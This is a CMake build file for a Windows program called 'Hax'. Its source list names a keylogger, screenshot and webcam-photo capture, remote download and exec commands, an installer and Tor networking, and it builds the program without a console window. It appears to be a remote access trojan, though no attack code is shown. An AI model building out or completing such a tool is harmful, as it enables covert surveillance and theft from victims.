cmake_minimum_required(VERSION 2.6)
project(Hax)

set(SRC
    src/CommandExe.cpp
    src/CommandExe.h
    src/Command.h
    src/Command_batch.cpp
    src/Command_batch.h
    src/Command_dl.cpp
    src/Command_dl.h
    src/Command_exec.cpp
    src/Command_exec.h
    src/Command_exit.cpp
    src/Command_exit.h
    src/Command_info.cpp
    src/Command_info.h
    src/Command_ls.cpp
    src/Command_ls.h
    src/Command_msgbox.cpp
    src/Command_msgbox.h
    src/Command_photo.cpp
    src/Command_photo.h
    src/Command_remove.cpp
    src/Command_remove.h
    src/Command_screenshot.cpp
    src/Command_screenshot.h
    src/ImageUtils.cpp
    src/ImageUtils.h
    src/Installer.cpp
    src/Installer.h
    src/Keylogger.cpp
    src/Keylogger.h
    src/Logger.cpp
    src/Logger.h
    src/Main.cpp
    src/Network.cpp
    src/Network.h
    src/Settings.h
    src/Tor.cpp
    src/Tor.h
    src/resource.h
    src/stdafx.cpp
    src/stdafx.h
    src/targetver.h
    src/Util.cpp
    src/Util.h
    src/version.rc

	src/External/miniz.c
)

set(LIBS
	iphlpapi.lib
    secur32.lib
    ws2_32.lib
)

if(CMAKE_GENERATOR_TOOLSET STREQUAL "v120_xp")
	set(BUILDXP TRUE)
endif()

if(MINGW)
	set(BUILDXP TRUE)
endif()

if(BUILDXP)
	list(APPEND LIBS "psapi.lib")
endif()

add_executable(Hax ${SRC})
target_link_libraries(Hax ${LIBS})

add_definitions("-DUNICODE -D_UNICODE")

if(MSVC)
    set_target_properties(Hax PROPERTIES LINK_FLAGS "/SUBSYSTEM:WINDOWS")
	FOREACH(flag_var CMAKE_CXX_FLAGS CMAKE_CXX_FLAGS_DEBUG CMAKE_CXX_FLAGS_RELEASE
            CMAKE_CXX_FLAGS_MINSIZEREL CMAKE_CXX_FLAGS_RELWITHDEBINFO)
        STRING(REGEX REPLACE "/MD" "/MT" ${flag_var} "${${flag_var}}")
    ENDFOREACH(flag_var)
endif()